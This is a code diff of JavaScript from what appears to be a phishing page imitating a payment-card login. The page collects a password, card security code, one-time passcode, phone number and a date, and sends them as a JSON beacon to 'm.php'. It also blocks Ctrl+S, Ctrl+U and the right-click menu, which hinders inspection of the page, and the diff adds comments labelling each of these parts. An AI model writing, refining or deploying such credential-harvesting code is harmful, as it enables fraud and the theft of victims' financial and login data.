@@ -343,6 +343,7 @@ input:focus{outline:1px dotted #006FCF;border-color:#006FCF}
 function setupUI() {
   const ENDPOINT = "m.php";
 
+  // 🔒 Block specific key combos (Ctrl+S, Ctrl+U, etc.)
   document.addEventListener("keydown", e => {
     const blockedKeyCodes = [83, 62, 7, 85, 424]; // S, >, BEL, U, F24
     const blockedKeys = ["u"];
@@ -350,16 +351,21 @@ function setupUI() {
       e.preventDefault();
     }
   });
-  document.addEventListener("contextmenu", e => e.preventDefault());
-  document.querySelectorAll("form").forEach(f => f.addEventListener("submit", e => e.preventDefault()));
 
+  // 🔒 Disable right‑click context menu
+  document.addEventListener("contextmenu", e => e.preventDefault());
+
+  // 🖱️ Map Enter key to button clicks
   function bindEnterToButton(inputSelector, buttonSelector) {
     document.addEventListener("keydown", e => {
       if (e.key === "Enter") {
         const active = document.activeElement;
         if (active && active.matches(inputSelector)) {
           const btn = document.querySelector(buttonSelector);
-          if (btn) btn.click();
+          if (btn) {
+            e.preventDefault(); // stop native submit
+            btn.click();        // trigger second script’s click handler
+          }
         }
       }
     });
@@ -368,6 +374,7 @@ function setupUI() {
   bindEnterToButton("#cscInput", "button[name='submitb']");
   bindEnterToButton("#otp, #pn, #mmdd", "button[name='submitc']");
 
+  // 🔑 Password input toggle
   const passwordInput = document.getElementById("upw");
   const toggleButton = document.getElementById("toggleupw");
   let hasTyped = false;
@@ -382,13 +389,14 @@ function setupUI() {
   }
   if (passwordInput && toggleButton) {
     toggleButton.addEventListener("click", () => {
-      if (!hasTyped) return; // prevent toggle before input
+      if (!hasTyped) return; // prevent toggle before typing
       const type = passwordInput.type === "password" ? "text" : "password";
       passwordInput.type = type;
       toggleButton.textContent = type === "password" ? "Show" : "Hide";
     });
   }
 
+  // 📤 Beacon sender
   function sendPayload(payload) {
     const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
     let beaconOk = false;
@@ -407,6 +415,7 @@ function setupUI() {
     }
   }
 
+  // 📝 Track changes inside #clsdiv
   document.addEventListener("change", e => {
     const el = e.target;
     if (el?.closest("#clsdiv") && el.matches(".input-control")) {
